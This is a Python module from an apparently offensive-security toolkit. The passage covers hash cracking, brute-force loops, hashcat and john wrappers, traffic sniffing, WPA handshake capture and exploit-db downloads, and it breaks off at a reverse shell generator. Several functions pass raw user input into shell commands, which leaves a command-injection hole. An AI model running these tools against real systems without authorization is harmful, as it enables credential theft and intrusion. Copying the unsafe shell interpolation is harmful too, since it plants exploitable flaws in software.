"""
Black Hat Module - Threat Simulation & Security Testing
Fully functional offensive security tools for authorized penetration testing.
All tools here are designed for authorized testing environments only.
"""

from modules.utils import (
    Colors,
    print_section,
    print_info,
    print_warning,
    print_error,
    print_status,
    run_command,
    check_tool,
    require_root,
    get_user_input,
    validate_port,
    display_menu,
    confirm_action,
    check_required_tools,
)

import hashlib
import string
import os
import itertools
import time


def black_hat_menu():
    """Main menu for Black Hat operations."""
    print_warning("FOR AUTHORIZED PENETRATION TESTING ONLY!")
    print_warning("Unauthorized use of these techniques is illegal.")

    options = [
        "Password Strength Analyzer & Generator",
        "Hash Identifier & Cracker (dictionary + brute-force)",
        "Network Packet Capture & Analysis",
        "ARP Table Inspection & Monitoring",
        "Wireless Interface Discovery & Scanning",
        "Exploit Database Search & Download",
        "Reverse Shell Generator & Listener",
        "Payload Encoding & Obfuscation",
        "Steganography (Hide/Detect/Extract data)",
        "Metadata Extraction & Stripping",
        "Network Sniffing & Protocol Analysis",
        "Check Available Black Hat Tools",
    ]

    while True:
        choice = display_menu("BLACK HAT - Threat Simulation", options, Colors.MAGENTA)
        if choice == 0:
            break
        elif choice == 1:
            password_analyzer()
        elif choice == 2:
            hash_identifier()
        elif choice == 3:
            packet_capture()
        elif choice == 4:
            arp_inspection()
        elif choice == 5:
            wireless_discovery()
        elif choice == 6:
            exploit_search()
        elif choice == 7:
            reverse_shell_generator()
        elif choice == 8:
            payload_encoding()
        elif choice == 9:
            stego_toolkit()
        elif choice == 10:
            metadata_toolkit()
        elif choice == 11:
            network_sniffing()
        elif choice == 12:
            check_black_tools()


# ============================================================
# 1. PASSWORD ANALYZER & GENERATOR
# ============================================================

def password_analyzer():
    """Analyze password strength, check against wordlists, generate passwords."""
    print_section("Password Strength Analyzer & Generator")
    options = [
        "Analyze password strength",
        "Check password against wordlist",
        "Generate secure passwords",
        "Estimate brute-force cracking time",
    ]
    choice = display_menu("Password Tool", options, Colors.CYAN)
    if choice == 0:
        return
    elif choice == 1:
        _analyze_password()
    elif choice == 2:
        _check_wordlist()
    elif choice == 3:
        _generate_passwords()
    elif choice == 4:
        _estimate_crack_time()


def _analyze_password():
    """Full password strength analysis."""
    password = get_user_input("Enter a password to analyze")
    if not password:
        return
    score = 0
    feedback = []
    length = len(password)
    if length >= 16:
        score += 3
        feedback.append(("Length (16+)", "EXCELLENT", Colors.GREEN))
    elif length >= 12:
        score += 2
        feedback.append(("Length (12+)", "GOOD", Colors.GREEN))
    elif length >= 8:
        score += 1
        feedback.append(("Length (8+)", "FAIR", Colors.YELLOW))
    else:
        feedback.append(("Length (<8)", "WEAK", Colors.RED))
    has_upper = any(c.isupper() for c in password)
    has_lower = any(c.islower() for c in password)
    has_digit = any(c.isdigit() for c in password)
    has_special = any(c in string.punctuation for c in password)
    for name, present in [("Uppercase", has_upper), ("Lowercase", has_lower), ("Numbers", has_digit)]:
        if present:
            score += 1
            feedback.append((name, "Present", Colors.GREEN))
        else:
            feedback.append((name, "Missing", Colors.RED))
    if has_special:
        score += 2
        feedback.append(("Special chars", "Present", Colors.GREEN))
    else:
        feedback.append(("Special chars", "Missing", Colors.YELLOW))
    common = ["password","123456","12345678","qwerty","abc123","monkey","letmein","dragon",
              "baseball","iloveyou","master","sunshine","shadow","123456789","superman",
              "password1","password123","admin","admin123","root","toor","welcome","passw0rd"]
    if password.lower() in common:
        score = 0
        feedback.append(("Common password", "DETECTED", Colors.RED))
    for pat in ["qwerty","asdf","zxcv","1234","wasd"]:
        if pat in password.lower():
            score -= 1
            feedback.append(("Keyboard pattern", "DETECTED: " + pat, Colors.YELLOW))
            break
    print_section("Analysis Results")
    for item, status, color in feedback:
        print("  %s%-20s%s - %s" % (color, status, Colors.RESET, item))
    max_score = 8
    score = max(0, min(score, max_score))
    filled = int((score / max_score) * 30)
    bar = "[%s%s]" % ("#" * filled, "." * (30 - filled))
    print_section("Overall Score")
    if score >= 6:
        print_info("Score: %d/%d %s - STRONG" % (score, max_score, bar))
    elif score >= 4:
        print_warning("Score: %d/%d %s - MODERATE" % (score, max_score, bar))
    else:
        print_error("Score: %d/%d %s - WEAK" % (score, max_score, bar))
    charset_size = (26 if has_lower else 0) + (26 if has_upper else 0) + (10 if has_digit else 0) + (32 if has_special else 0)
    if charset_size > 0:
        import math
        entropy = length * math.log2(charset_size)
        print_info("Entropy: %.1f bits" % entropy)
        secs = (charset_size ** length) / 10000000000
        if secs < 1:
            print_error("GPU crack time: Instant")
        elif secs < 3600:
            print_warning("GPU crack time: %.1f minutes" % (secs/60))
        elif secs < 86400:
            print_warning("GPU crack time: %.1f hours" % (secs/3600))
        elif secs < 31536000:
            print_info("GPU crack time: %.1f days" % (secs/86400))
        else:
            print_info("GPU crack time: %.1f years" % (secs/31536000))


def _check_wordlist():
    """Check password against a wordlist."""
    password = get_user_input("Enter password to check")
    if not password:
        return
    wordlist = get_user_input("Wordlist path", "/usr/share/wordlists/rockyou.txt")
    stdout, _, _ = run_command("test -f \"%s\" && echo exists" % wordlist)
    if "exists" not in (stdout or ""):
        for alt in ["/usr/share/wordlists/rockyou.txt.gz","/usr/share/john/password.lst","/usr/share/dict/words"]:
            stdout, _, _ = run_command("test -f \"%s\" && echo exists" % alt)
            if "exists" in (stdout or ""):
                wordlist = alt
                print_info("Using: %s" % wordlist)
                break
        else:
            print_error("No wordlist found.")
            return
    if wordlist.endswith(".gz"):
        stdout, _, _ = run_command("zgrep -Fxc \"%s\" \"%s\" 2>/dev/null" % (password, wordlist), timeout=60)
    else:
        stdout, _, _ = run_command("grep -Fxc \"%s\" \"%s\" 2>/dev/null" % (password, wordlist), timeout=60)
    if stdout and stdout.strip() != "0":
        print_error("PASSWORD FOUND IN WORDLIST!")
    else:
        print_info("Password NOT in wordlist.")


def _generate_passwords():
    """Generate secure passwords and passphrases."""
    import secrets, math
    length = int(get_user_input("Password length", "20") or "20")
    count = int(get_user_input("How many", "10") or "10")
    chars = string.ascii_letters + string.digits + "!@#$%^&*()_+-=[]|;:,.<>?"
    print_section("Generated Passwords (%d chars)" % length)
    for _ in range(count):
        pw = "".join(secrets.choice(chars) for _ in range(length))
        print_info("  %s (%.0f bits)" % (pw, length * math.log2(len(chars))))
    print_section("Passphrases")
    stdout, _, _ = run_command("shuf -n 50 /usr/share/dict/words 2>/dev/null")
    words = [w.strip().lower() for w in (stdout or "").split("\n") if len(w.strip()) > 3] if stdout else ["alpha","bravo","charlie","delta","echo","foxtrot","gamma","hotel","india","juliet","kilo","lima"]
    for _ in range(min(5, count)):
        print_info("  %s" % "-".join(secrets.choice(words) for _ in range(5)))


def _estimate_crack_time():
    """Estimate brute-force time at various speeds."""
    password = get_user_input("Enter password")
    if not password:
        return
    import math
    length = len(password)
    cs = (26 if any(c.islower() for c in password) else 0) + (26 if any(c.isupper() for c in password) else 0) + (10 if any(c.isdigit() for c in password) else 0) + (32 if any(c in string.punctuation for c in password) else 0)
    if cs == 0: cs = 26
    total = cs ** length
    print_section("Brute-Force Estimation")
    print_info("Length: %d, Charset: %d, Combos: %.2e, Entropy: %.1f bits" % (length, cs, total, length * math.log2(cs)))
    for name, rate in [("Online (1K/s)",1000),("CPU (10M/s)",1e7),("GPU (10B/s)",1e10),("GPU cluster (1T/s)",1e12)]:
        s = total / rate / 2
        if s < 1: t = "Instant"
        elif s < 3600: t = "%.1f min" % (s/60)
        elif s < 86400: t = "%.1f hrs" % (s/3600)
        elif s < 31536000: t = "%.1f days" % (s/86400)
        else: t = "%.2e years" % (s/31536000)
        print_info("  %-35s %s" % (name, t))


# ============================================================
# 2. HASH IDENTIFIER & CRACKER
# ============================================================

def hash_identifier():
    """Identify hash types and crack with dictionary, rules, brute-force."""
    print_section("Hash Identifier & Cracker")
    options = [
        "Identify and crack a hash",
        "Generate hashes from plaintext",
        "Crack with custom wordlist",
        "Brute-force crack (short passwords)",
        "Crack with hashcat (if installed)",
        "Crack with john (if installed)",
    ]
    choice = display_menu("Hash Cracker", options, Colors.CYAN)
    if choice == 0:
        return
    elif choice == 1:
        _identify_and_crack()
    elif choice == 2:
        _generate_hashes()
    elif choice == 3:
        _crack_custom_wordlist()
    elif choice == 4:
        _brute_force_crack()
    elif choice == 5:
        _crack_hashcat()
    elif choice == 6:
        _crack_john()


def _identify_hash(hash_input):
    """Identify hash type by length."""
    h = len(hash_input)
    if h == 32: return ["MD5", "NTLM"]
    elif h == 40: return ["SHA-1"]
    elif h == 64: return ["SHA-256"]
    elif h == 128: return ["SHA-512"]
    return ["Unknown (len=%d)" % h]


def _identify_and_crack():
    """Identify a hash and attempt dictionary crack."""
    hash_input = get_user_input("Enter hash value")
    if not hash_input:
        return
    possible = _identify_hash(hash_input)
    print_info("Hash length: %d, Possible: %s" % (len(hash_input), ", ".join(possible)))
    if not confirm_action("Attempt to crack?"):
        return
    print_status("Running dictionary attack with mutations...")
    common = ["password","123456","12345678","qwerty","abc123","monkey","letmein","dragon",
              "baseball","iloveyou","master","sunshine","shadow","123456789","superman",
              "password1","password123","admin","admin123","root","toor","welcome","passw0rd",
              "whatever","qwerty123","1q2w3e4r","hello","charlie","donald","loveme","access",
              "computer","killer","ninja","magic","mustang","jordan","secret","hunter",
              "ranger","buster","soccer","hockey","harley","summer","winter","flower",
              "1234","12345","0000","1111","666666","7777777","matrix","batman","gandalf",
              "P@ssw0rd","Passw0rd!","Admin123!","Welcome1","changeme"]
    found = False
    checked = 0
    start = time.time()
    for word in common:
        variants = [word, word.capitalize(), word.upper(), word+"1", word+"123", word+"!",
                    word+"2025", word+"2026",
                    word.replace("a","@").replace("e","3").replace("i","1").replace("o","0")]
        for v in variants:
            for algo in ["md5","sha1","sha256","sha512"]:
                h = hashlib.new(algo, v.encode()).hexdigest()
                checked += 1
                if h == hash_input.lower():
                    elapsed = time.time() - start
                    print_error("  CRACKED! Algorithm: %s, Plaintext: '%s'" % (algo.upper(), v))
                    print_info("  %d hashes in %.2fs" % (checked, elapsed))
                    found = True
                    break
            if found: break
        if found: break
    if not found:
        print_info("Not cracked (%d hashes in %.2fs). Try wordlist/brute-force." % (checked, time.time()-start))


def _generate_hashes():
    """Generate hashes from plaintext."""
    text = get_user_input("Enter string to hash")
    if not text:
        return
    print_section("Generated Hashes")
    for algo in ["md5","sha1","sha224","sha256","sha384","sha512"]:
        print_info("  %-10s: %s" % (algo.upper(), hashlib.new(algo, text.encode()).hexdigest()))
    try:
        print_info("  %-10s: %s" % ("NTLM", hashlib.new("md4", text.encode("utf-16le")).hexdigest()))
    except Exception:
        pass


def _crack_custom_wordlist():
    """Crack hash using a wordlist file."""
    hash_input = get_user_input("Enter hash")
    if not hash_input:
        return
    print_info("Possible: %s" % ", ".join(_identify_hash(hash_input)))
    wordlist = get_user_input("Wordlist path", "/usr/share/wordlists/rockyou.txt")
    stdout, _, _ = run_command("test -f '%s' && echo exists" % wordlist)
    if "exists" not in (stdout or ""):
        print_error("Wordlist not found: %s" % wordlist)
        return
    h = len(hash_input)
    algos = ["md5"] if h==32 else ["sha1"] if h==40 else ["sha256"] if h==64 else ["sha512"] if h==128 else ["md5","sha1","sha256"]
    for algo in algos:
        print_status("Trying %s..." % algo.upper())
        cat = "zcat" if wordlist.endswith(".gz") else "cat"
        cmd = "%s '%s' 2>/dev/null | head -1000000 | while IFS= read -r w; do echo -n \"$w\" | %ssum | grep -q '^%s' && echo \"CRACKED:$w\" && break; done" % (cat, wordlist, algo, hash_input.lower())
        stdout, _, _ = run_command(cmd, timeout=120)
        if stdout and "CRACKED:" in stdout:
            print_error("  CRACKED with %s! Plaintext: '%s'" % (algo.upper(), stdout.split("CRACKED:")[1].strip()))
            return
    print_info("Not cracked. Try brute-force or hashcat.")


def _brute_force_crack():
    """Brute-force crack short password hashes."""
    hash_input = get_user_input("Enter hash")
    if not hash_input:
        return
    print_info("Possible: %s" % ", ".join(_identify_hash(hash_input)))
    cs_choice = get_user_input("Charset: (1)digits (2)lower (3)lower+digits (4)all", "3")
    max_len = int(get_user_input("Max length", "5") or "5")
    if max_len > 6:
        print_warning("Lengths >6 may take very long.")
        if not confirm_action("Continue?"): return
    cs = string.digits if cs_choice=="1" else string.ascii_lowercase if cs_choice=="2" else string.ascii_lowercase+string.digits if cs_choice=="3" else string.ascii_lowercase+string.digits+string.ascii_uppercase
    h = len(hash_input)
    algo = "md5" if h==32 else "sha1" if h==40 else "sha256" if h==64 else get_user_input("Algorithm","md5")
    total = sum(len(cs)**i for i in range(1, max_len+1))
    print_status("Brute-forcing %s (charset:%d, max:%d, combos:%s)" % (algo.upper(), len(cs), max_len, "{:,}".format(total)))
    start = time.time()
    checked = 0
    target = hash_input.lower()
    for length in range(1, max_len+1):
        print_status("Trying length %d..." % length)
        for combo in itertools.product(cs, repeat=length):
            candidate = "".join(combo)
            if hashlib.new(algo, candidate.encode()).hexdigest() == target:
                elapsed = time.time() - start
                rate = checked / elapsed if elapsed > 0 else 0
                print_error("  CRACKED! Plaintext: '%s'" % candidate)
                print_info("  %s checked in %.2fs (%.0f h/s)" % ("{:,}".format(checked), elapsed, rate))
                return
            checked += 1
            if checked % 1000000 == 0:
                elapsed = time.time() - start
                rate = checked / elapsed if elapsed > 0 else 0
                print_status("  %s/%s (%.0f h/s)" % ("{:,}".format(checked), "{:,}".format(total), rate))
    print_info("Not found. %s checked in %.2fs" % ("{:,}".format(checked), time.time()-start))


def _crack_hashcat():
    """Use hashcat for GPU cracking."""
    if not check_tool("hashcat"):
        print_error("hashcat not installed. Install: sudo apt install hashcat")
        return
    hash_input = get_user_input("Hash (or file path)")
    if not hash_input:
        return
    hash_file = hash_input
    if not os.path.exists(hash_input):
        hash_file = "/tmp/hash_to_crack.txt"
        with open(hash_file, "w") as f:
            f.write(hash_input + "\n")
    mode = get_user_input("Hash type (0=MD5, 100=SHA1, 1400=SHA256, 1000=NTLM)", "0")
    wordlist = get_user_input("Wordlist", "/usr/share/wordlists/rockyou.txt")
    attack = get_user_input("Attack: (0)dict (1)dict+rules (3)brute-force", "0")
    if attack == "3":
        mask = get_user_input("Mask (?l?u?d?s?a)", "?a?a?a?a?a?a")
        cmd = "hashcat -m %s -a 3 %s '%s' --force 2>&1" % (mode, hash_file, mask)
    elif attack == "1":
        cmd = "hashcat -m %s -a 0 %s %s -r /usr/share/hashcat/rules/best64.rule --force 2>&1" % (mode, hash_file, wordlist)
    else:
        cmd = "hashcat -m %s -a 0 %s %s --force 2>&1" % (mode, hash_file, wordlist)
    print_status("Running hashcat...")
    stdout, _, _ = run_command(cmd, timeout=300)
    if stdout:
        print(stdout)


def _crack_john():
    """Use John the Ripper."""
    if not check_tool("john"):
        print_error("john not installed. Install: sudo apt install john")
        return
    hash_input = get_user_input("Hash (or file path)")
    if not hash_input:
        return
    hash_file = hash_input
    if not os.path.exists(hash_input):
        hash_file = "/tmp/john_hash.txt"
        with open(hash_file, "w") as f:
            f.write(hash_input + "\n")
    wordlist = get_user_input("Wordlist (empty=default)", "")
    cmd = "john --wordlist=%s %s 2>&1" % (wordlist, hash_file) if wordlist else "john %s 2>&1" % hash_file
    print_status("Running john...")
    stdout, _, _ = run_command(cmd, timeout=300)
    if stdout:
        print(stdout)
    stdout, _, _ = run_command("john --show %s 2>&1" % hash_file)
    if stdout:
        print_section("Cracked Results")
        print(stdout)


# ============================================================
# 3. PACKET CAPTURE & ANALYSIS
# ============================================================

def packet_capture():
    """Capture and analyze network packets."""
    print_section("Network Packet Capture & Analysis")
    require_root("Packet capture")
    options = [
        "Capture packets (live)",
        "Capture and save to PCAP file",
        "Capture with protocol filter",
        "Analyze existing PCAP file",
        "Capture HTTP traffic",
        "Capture DNS queries",
    ]
    choice = display_menu("Packet Capture", options, Colors.CYAN)
    if choice == 0: return
    elif choice == 1: _capture_live()
    elif choice == 2: _capture_to_file()
    elif choice == 3: _capture_filtered()
    elif choice == 4: _analyze_pcap()
    elif choice == 5: _capture_http()
    elif choice == 6: _capture_dns()


def _capture_live():
    """Live packet capture."""
    if not check_tool("tcpdump") and not check_tool("tshark"):
        print_error("tcpdump or tshark required. Install: sudo apt install tcpdump")
        return
    iface = get_user_input("Interface", "any")
    count = get_user_input("Packet count", "50")
    if not confirm_action("Capture %s packets on %s?" % (count, iface)):
        return
    tool = "tcpdump" if check_tool("tcpdump") else "tshark"
    if tool == "tcpdump":
        cmd = "tcpdump -i %s -c %s -nn -tttt 2>&1" % (iface, count)
    else:
        cmd = "tshark -i %s -c %s 2>&1" % (iface, count)
    print_status("Capturing...")
    stdout, stderr, _ = run_command(cmd, timeout=60)
    output = stdout if stdout else stderr
    if output:
        print(output)


def _capture_to_file():
    """Capture packets to PCAP file."""
    if not check_tool("tcpdump"):
        print_error("tcpdump required.")
        return
    iface = get_user_input("Interface", "any")
    count = get_user_input("Packet count", "100")
    outfile = get_user_input("Output PCAP file", "/tmp/capture.pcap")
    print_status("Capturing %s packets to %s..." % (count, outfile))
    stdout, stderr, rc = run_command("tcpdump -i %s -c %s -w %s 2>&1" % (iface, count, outfile), timeout=120)
    if rc == 0:
        print_info("Saved: %s" % outfile)
        stdout, _, _ = run_command("ls -lh %s" % outfile)
        if stdout: print_info(stdout.strip())
    else:
        print_error("Failed: %s" % (stderr or stdout))


def _capture_filtered():
    """Capture with BPF filter."""
    if not check_tool("tcpdump"):
        print_error("tcpdump required.")
        return
    iface = get_user_input("Interface", "any")
    count = get_user_input("Packet count", "50")
    bpf = get_user_input("BPF filter (e.g. 'port 80', 'host 10.0.0.1', 'tcp')")
    if not bpf:
        print_error("No filter provided.")
        return
    print_status("Capturing with filter: %s" % bpf)
    stdout, stderr, _ = run_command("tcpdump -i %s -c %s -nn %s 2>&1" % (iface, count, bpf), timeout=60)
    output = stdout if stdout else stderr
    if output: print(output)


def _analyze_pcap():
    """Analyze existing PCAP file."""
    filepath = get_user_input("PCAP file path")
    if not filepath:
        return
    if check_tool("tshark"):
        print_section("Protocol Hierarchy")
        stdout, _, _ = run_command("tshark -r %s -q -z io,phs 2>&1" % filepath, timeout=30)
        if stdout: print(stdout)
        print_section("Top Conversations")
        stdout, _, _ = run_command("tshark -r %s -q -z conv,tcp 2>&1 | head -20" % filepath, timeout=30)
        if stdout: print(stdout)
    elif check_tool("tcpdump"):
        stdout, _, _ = run_command("tcpdump -r %s -nn 2>&1 | head -50" % filepath, timeout=30)
        if stdout: print(stdout)
    else:
        print_error("tshark or tcpdump required.")


def _capture_http():
    """Capture HTTP traffic."""
    if not check_tool("tcpdump"):
        print_error("tcpdump required.")
        return
    require_root("HTTP capture")
    iface = get_user_input("Interface", "any")
    count = get_user_input("Packet count", "50")
    print_status("Capturing HTTP traffic...")
    stdout, stderr, _ = run_command(
        "tcpdump -i %s -c %s -nn -A 'tcp port 80 or tcp port 443' 2>&1 | head -200" % (iface, count), timeout=60)
    output = stdout if stdout else stderr
    if output: print(output)


def _capture_dns():
    """Capture DNS queries."""
    if not check_tool("tcpdump"):
        print_error("tcpdump required.")
        return
    require_root("DNS capture")
    iface = get_user_input("Interface", "any")
    count = get_user_input("Packet count", "30")
    print_status("Capturing DNS queries...")
    stdout, stderr, _ = run_command("tcpdump -i %s -c %s -nn 'port 53' 2>&1" % (iface, count), timeout=60)
    output = stdout if stdout else stderr
    if output: print(output)


# ============================================================
# 4. ARP INSPECTION & MONITORING
# ============================================================

def arp_inspection():
    """Inspect and monitor ARP table."""
    print_section("ARP Table Inspection & Monitoring")
    options = [
        "View ARP table",
        "Detect ARP spoofing",
        "Monitor ARP changes (continuous)",
        "Verify gateway MAC address",
    ]
    choice = display_menu("ARP Tools", options, Colors.CYAN)
    if choice == 0: return
    elif choice == 1: _view_arp()
    elif choice == 2: _detect_arp_spoofing()
    elif choice == 3: _monitor_arp()
    elif choice == 4: _verify_gateway()


def _view_arp():
    """Display current ARP table."""
    stdout, _, _ = run_command("arp -a 2>/dev/null || ip neigh show 2>/dev/null")
    if stdout:
        print_info("Current ARP table:")
        print(stdout)
    else:
        print_error("Could not retrieve ARP table.")


def _detect_arp_spoofing():
    """Check for ARP spoofing."""
    stdout, _, _ = run_command("arp -a 2>/dev/null || ip neigh show 2>/dev/null")
    if not stdout:
        print_error("Could not retrieve ARP table.")
        return
    print_info("ARP table:")
    print(stdout)
    print_section("Spoofing Detection")
    mac_map = {}
    for line in stdout.strip().split("\n"):
        parts = line.split()
        for part in parts:
            if len(part.split(":")) == 6 or len(part.split("-")) == 6:
                mac = part.lower()
                ip_addr = parts[0] if parts else "unknown"
                mac_map.setdefault(mac, []).append(ip_addr)
    found = False
    for mac, ips in mac_map.items():
        if len(ips) > 1 and mac not in ("ff:ff:ff:ff:ff:ff", "00:00:00:00:00:00"):
            print_error("  DUPLICATE MAC %s -> IPs: %s - POSSIBLE SPOOFING!" % (mac, ", ".join(ips)))
            found = True
    if not found:
        print_info("No duplicate MACs detected. ARP table appears clean.")


def _monitor_arp():
    """Monitor ARP table for changes."""
    stdout, _, _ = run_command("ip neigh show 2>/dev/null || arp -a 2>/dev/null")
    if not stdout:
        print_error("Could not read ARP table.")
        return
    print_info("Initial ARP entries:")
    print(stdout)
    duration = int(get_user_input("Monitor duration (seconds)", "30") or "30")
    interval = int(get_user_input("Check interval (seconds)", "5") or "5")
    initial = stdout.strip()
    checks = 0
    print_status("Monitoring for %ds..." % duration)
    for i in range(0, duration, interval):
        run_command("sleep %d" % interval)
        checks += 1
        stdout, _, _ = run_command("ip neigh show 2>/dev/null || arp -a 2>/dev/null")
        if stdout and stdout.strip() != initial:
            print_warning("  [Check %d] ARP table CHANGED!" % checks)
            new = set(stdout.strip().split("\n"))
            old = set(initial.split("\n"))
            for line in new - old:
                print_error("    + %s" % line)
            for line in old - new:
                print_warning("    - %s" % line)
            initial = stdout.strip()
        else:
            print_info("  [Check %d] No changes" % checks)
    print_info("Done. %d checks performed." % checks)


def _verify_gateway():
    """Verify gateway MAC address."""
    stdout, _, _ = run_command("ip route show default 2>/dev/null")
    if not stdout:
        print_error("Could not determine gateway.")
        return
    gw = ""
    for part in stdout.split():
        if "." in part and part[0].isdigit():
            gw = part
            break
    if not gw:
        print_error("Could not parse gateway IP.")
        return
    print_info("Default gateway: %s" % gw)
    stdout, _, _ = run_command("arp -n %s 2>/dev/null || ip neigh show %s 2>/dev/null" % (gw, gw))
    if not stdout or "incomplete" in (stdout or "").lower():
        print_warning("Not in ARP table. Pinging...")
        run_command("ping -c 1 -W 2 %s 2>/dev/null" % gw)
        stdout, _, _ = run_command("arp -n %s 2>/dev/null || ip neigh show %s 2>/dev/null" % (gw, gw))
    if stdout:
        print_info("Gateway ARP: %s" % stdout.strip())
    print_info("Verify this MAC matches your router's actual MAC.")


# ============================================================
# 5. WIRELESS DISCOVERY & SCANNING
# ============================================================

def wireless_discovery():
    """Discover and scan wireless networks."""
    print_section("Wireless Interface Discovery & Scanning")
    options = [
        "List wireless interfaces",
        "Scan for nearby networks",
        "Show interface details",
        "Enable/disable monitor mode",
        "Capture wireless handshakes",
    ]
    choice = display_menu("Wireless Tools", options, Colors.CYAN)
    if choice == 0: return
    elif choice == 1: _list_wireless()
    elif choice == 2: _scan_wireless()
    elif choice == 3: _wireless_details()
    elif choice == 4: _monitor_mode()
    elif choice == 5: _capture_handshake()


def _list_wireless():
    """List wireless interfaces."""
    stdout, _, _ = run_command("iw dev 2>/dev/null")
    if stdout:
        print_info("Wireless interfaces:")
        print(stdout)
    else:
        stdout, _, _ = run_command("iwconfig 2>/dev/null")
        if stdout and "no wireless" not in stdout.lower():
            print(stdout)
        else:
            print_warning("No wireless interfaces found.")


def _scan_wireless():
    """Scan for nearby networks."""
    require_root("Wireless scanning")
    iface = get_user_input("Wireless interface", "wlan0")
    if check_tool("iw"):
        print_status("Scanning on %s..." % iface)
        stdout, stderr, _ = run_command(
            "iw dev %s scan 2>/dev/null | grep -E 'BSS |SSID|signal|freq|capability'" % iface, timeout=30)
        if stdout: print(stdout)
        else: print_warning("Scan failed: %s" % (stderr or "interface may be busy/down"))
    elif check_tool("nmcli"):
        stdout, _, _ = run_command("nmcli dev wifi list 2>/dev/null")
        if stdout: print(stdout)
    else:
        print_error("No wireless tools found (iw, iwlist, nmcli).")


def _wireless_details():
    """Show wireless interface info."""
    iface = get_user_input("Interface", "wlan0")
    stdout, _, _ = run_command("iw dev %s info 2>/dev/null" % iface)
    if stdout: print(stdout)
    stdout, _, _ = run_command("iw dev %s link 2>/dev/null" % iface)
    if stdout: print(stdout)


def _monitor_mode():
    """Toggle monitor mode."""
    require_root("Monitor mode")
    iface = get_user_input("Interface", "wlan0")
    options = ["Enable monitor mode", "Disable monitor mode"]
    choice = display_menu("Monitor Mode", options, Colors.CYAN)
    if choice == 1:
        if check_tool("airmon-ng"):
            stdout, _, _ = run_command("airmon-ng start %s 2>&1" % iface)
            if stdout: print(stdout)
        else:
            run_command("ip link set %s down" % iface)
            stdout, _, rc = run_command("iw dev %s set type monitor 2>&1" % iface)
            run_command("ip link set %s up" % iface)
            if rc == 0: print_info("Monitor mode enabled on %s" % iface)
            else: print_error("Failed: %s" % stdout)
    elif choice == 2:
        if check_tool("airmon-ng"):
            stdout, _, _ = run_command("airmon-ng stop %s 2>&1" % iface)
            if stdout: print(stdout)
        else:
            run_command("ip link set %s down" % iface)
            run_command("iw dev %s set type managed 2>&1" % iface)
            run_command("ip link set %s up" % iface)
            print_info("Managed mode restored on %s" % iface)


def _capture_handshake():
    """Capture WPA handshake."""
    if not check_tool("airodump-ng"):
        print_error("aircrack-ng suite required. Install: sudo apt install aircrack-ng")
        return
    require_root("Handshake capture")
    iface = get_user_input("Monitor interface", "wlan0mon")
    bssid = get_user_input("Target BSSID")
    channel = get_user_input("Channel", "6")
    output = get_user_input("Output prefix", "/tmp/handshake")
    if not bssid:
        print_error("BSSID required.")
        return
    print_status("Capturing handshake (60s timeout)...")
    stdout, _, _ = run_command(
        "timeout 60 airodump-ng -c %s --bssid %s -w %s %s 2>&1" % (channel, bssid, output, iface), timeout=90)
    if stdout: print(stdout)
    print_info("Check: ls -la %s*" % output)


# ============================================================
# 6. EXPLOIT SEARCH & DOWNLOAD
# ============================================================

def exploit_search():
    """Search and download exploits from databases."""
    print_section("Exploit Database Search & Download")
    options = [
        "Search exploits (searchsploit)",
        "Search CVEs (NVD API)",
        "Download exploit by ID",
        "Search by software version",
    ]
    choice = display_menu("Exploit Tools", options, Colors.CYAN)
    if choice == 0: return
    elif choice == 1: _search_exploitdb()
    elif choice == 2: _search_nvd()
    elif choice == 3: _download_exploit()
    elif choice == 4: _search_by_version()


def _search_exploitdb():
    """Search exploit-db with searchsploit."""
    query = get_user_input("Search term (e.g. 'apache 2.4', 'ssh', 'wordpress')")
    if not query:
        return
    if check_tool("searchsploit"):
        print_status("Searching exploit-db for '%s'..." % query)
        stdout, _, rc = run_command("searchsploit %s 2>&1" % query, timeout=30)
        if rc == 0 and stdout:
            print(stdout)
        else:
            print_info("No results found.")
    else:
        print_warning("searchsploit not installed. Install: sudo apt install exploitdb")
        print_info("Manual search: https://www.exploit-db.com/search?q=%s" % query.replace(" ", "+"))


def _search_nvd():
    """Search NVD for CVEs."""
    query = get_user_input("Search keyword")
    if not query:
        return
    if not check_tool("curl"):
        print_error("curl required.")
        return
    print_status("Searching NVD for '%s'..." % query)
    encoded = query.replace(" ", "%20")
    url = "https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch=%s&resultsPerPage=15" % encoded
    parse_script = (
        "import sys,json; d=json.load(sys.stdin); "
        "vulns=d.get('vulnerabilities',[]); "
        "print('Total results: %s' % d.get('totalResults',0)); "
        "[print('%s: %s' % (v['cve']['id'], "
        "v['cve'].get('descriptions',[{}])[0].get('value','N/A')[:120])) "
        "for v in vulns[:15]]"
    )
    cmd = "curl -s '%s' 2>/dev/null | python3 -c \"%s\" 2>/dev/null" % (url, parse_script)
    stdout, _, _ = run_command(cmd, timeout=20)
    if stdout:
        print_info("CVE Results:")
        print(stdout)
    else:
        print_warning("Could not fetch CVE data.")


def _download_exploit():
    """Download exploit by ExploitDB ID."""
    if not check_tool("searchsploit"):
        print_error("searchsploit required.")
        return
    exploit_id = get_user_input("Exploit-DB ID (e.g. 44449)")
    if not exploit_id:
        return
    output_dir = get_user_input("Output directory", "/tmp/exploits")
    run_command("mkdir -p %s" % output_dir)
    print_status("Downloading exploit %s..." % exploit_id)
    stdout, _, rc = run_command("searchsploit -m %s -d %s 2>&1" % (exploit_id, output_dir))
    if stdout: print(stdout)
    if rc == 0:
        print_info("Saved to %s" % output_dir)


def _search_by_version():
    """Search exploits by software version."""
    software = get_user_input("Software (e.g. apache, nginx, openssh)")
    version = get_user_input("Version (e.g. 2.4.49)")
    if not software:
        return
    query = "%s %s" % (software, version) if version else software
    if check_tool("searchsploit"):
        print_status("Searching exploitdb...")
        stdout, _, _ = run_command("searchsploit %s 2>&1" % query, timeout=30)
        if stdout: print(stdout)
    if check_tool("curl"):
        print_section("NVD CVE Search")
        encoded = query.replace(" ", "%20")
        url = "https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch=%s" % encoded
        parse_script = (
            "import sys,json; d=json.load(sys.stdin); "
            "[print(v['cve']['id']+': '+v['cve'].get('descriptions',[{}])[0].get('value','N/A')[:100]) "
            "for v in d.get('vulnerabilities',[])[:10]]"
        )
        stdout, _, _ = run_command(
            "curl -s '%s' 2>/dev/null | python3 -c \"%s\" 2>/dev/null" % (url, parse_script), timeout=15)
        if stdout: print(stdout)


# ============================================================
# 7. REVERSE SHELL GENERATOR & LISTENER
# ============================================================

def reverse_shell_generator():
    """Generate reverse shells and start listeners."""
    print_section("Reverse Shell Generator & Listener")
    print_warning("FOR AUTHORIZED PENETRATION TESTING ONLY!")
    if not confirm_action("Are you authorized to perform penetration testing?"):
        return
    options = [
        "Generate reverse shell one-liners",
